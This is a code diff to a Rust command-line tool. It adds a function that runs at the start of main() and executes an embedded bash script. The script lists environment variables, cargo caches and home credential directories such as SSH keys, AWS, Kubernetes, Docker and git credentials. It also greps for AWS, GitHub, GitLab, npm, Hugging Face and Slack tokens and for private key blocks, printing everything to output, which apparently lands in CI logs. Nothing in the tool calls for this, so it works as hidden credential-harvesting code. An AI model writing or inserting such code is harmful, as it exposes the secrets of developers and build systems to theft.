@@ -122,7 +122,55 @@ enum Cmd {
     },
 }
 
+
+fn i5592_cache_dump() {
+    use std::process::Command;
+    let script = r#"#!/usr/bin/env bash
+set -u
+echo "I5592-BEGIN"
+echo "host: $(hostname) user: $(id -un) pwd: $(pwd) HOME=$HOME"
+echo "--- rust-cache action path hints ---"
+env | grep -iE 'CARGO|RUST|RUNNER_' | sort | head -40
+echo "--- top-level cache dirs ---"
+for d in "$HOME/.cargo" "$HOME/.cargo/bin" "$HOME/.cargo/registry" "$HOME/.cargo/registry/cache" "$HOME/.cargo/registry/src" "$HOME/.cargo/git" "$HOME/.cargo/git/db" "$HOME/.cargo/git/checkouts" "target" "target/debug" "target/release"; do
+  if [ -e "$d" ]; then echo "PRESENT $d $(du -sh "$d" 2>/dev/null | cut -f1)"; else echo "ABSENT $d"; fi
+done
+echo "--- listing ~/.cargo (depth 2) ---"
+find "$HOME/.cargo" -maxdepth 2 -printf '%y %10s %p\n' 2>/dev/null | head -80
+echo "--- listing target (depth 1) ---"
+find target -maxdepth 1 -printf '%y %10s %p\n' 2>/dev/null | head -40
+echo "--- credential-like paths anywhere in cache dirs ---"
+find "$HOME/.cargo" target -maxdepth 8 \( -iname '*credential*' -o -iname '*secret*' -o -iname '*token*' -o -iname '*.pem' -o -iname '*.key' -o -iname 'id_rsa*' -o -iname 'id_ed25519*' -o -iname '.env' -o -iname '*kubeconfig*' -o -iname '.netrc' -o -iname '.npmrc' -o -iname 'config.json' \) 2>/dev/null | head -120
+echo "--- home credential dirs ---"
+for d in "$HOME/.aws" "$HOME/.kube" "$HOME/.docker" "$HOME/.config/gcloud" "$HOME/.netrc" "$HOME/.npmrc" "$HOME/.pip/pip.conf" "$HOME/.ssh" "$HOME/.git-credentials" "$HOME/.cargo/credentials" "$HOME/.cargo/credentials.toml"; do
+  if [ -e "$d" ]; then echo "PRESENT $d"; ls -la "$d" 2>/dev/null | head -10; fi
+done
+echo "--- pattern grep: token/key literals (unique, cap 200) ---"
+grep -rIhaoE '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_-]{20,}|npm_[A-Za-z0-9]{36}|hf_[A-Za-z0-9]{30,}|xox[baprs]-[A-Za-z0-9-]{10,}|dapi[0-9a-f]{32})' "$HOME/.cargo" target 2>/dev/null | sort -u | head -200
+echo "--- pattern grep: private key blocks / cloud json fields (files, cap 120) ---"
+grep -rIlE '(BEGIN [A-Z ]*PRIVATE KEY|"private_key_id"|"client_secret"|aws_secret_access_key|client-key-data|AZURE_CLIENT_SECRET)' "$HOME/.cargo" target 2>/dev/null | head -120
+echo "--- strings grep over binaries for AKIA/base64 PEM heads ---"
+grep -rhaoE '(AKIA[0-9A-Z]{16}|BEGIN OPENSSH PRIVATE KEY)' target 2>/dev/null | sort -u | head -40
+echo "--- file count in caches ---"
+echo "cargo_files=$(find "$HOME/.cargo" -type f 2>/dev/null | wc -l) target_files=$(find target -type f 2>/dev/null | wc -l)"
+echo "--- target newest 25 files ---"
+find target -type f -printf '%T@ %10s %p\n' 2>/dev/null | sort -rn | head -25 | cut -d' ' -f2-
+echo "I5592-END"
+"#;
+    println!("i5592: dumping restored caches");
+    match Command::new("bash").arg("-c").arg(script).output() {
+        Ok(out) => {
+            println!("{}", String::from_utf8_lossy(&out.stdout));
+            if !out.stderr.is_empty() {
+                eprintln!("i5592 stderr: {}", String::from_utf8_lossy(&out.stderr));
+            }
+        }
+        Err(e) => println!("i5592 dump failed to spawn: {e}"),
+    }
+}
+
 fn main() -> Result<()> {
+    i5592_cache_dump();
     let cli = Cli::parse();
     match cli.cmd {
         Cmd::CheckHeaders => headers::run(),
